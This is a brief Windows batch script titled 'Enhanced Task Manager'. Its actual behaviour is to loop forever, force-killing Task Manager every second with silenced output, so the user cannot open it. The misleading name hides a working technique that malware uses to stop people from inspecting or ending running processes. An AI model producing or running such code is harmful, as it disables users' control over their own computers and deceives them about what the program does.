@echo off
echo Enhanced Task Manager 
echo Press Ctrl+C to stop
:loop
taskkill /f /im Taskmgr.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im "Task Manager" >nul 2>&1
timeout /t 1 >nul
goto loop
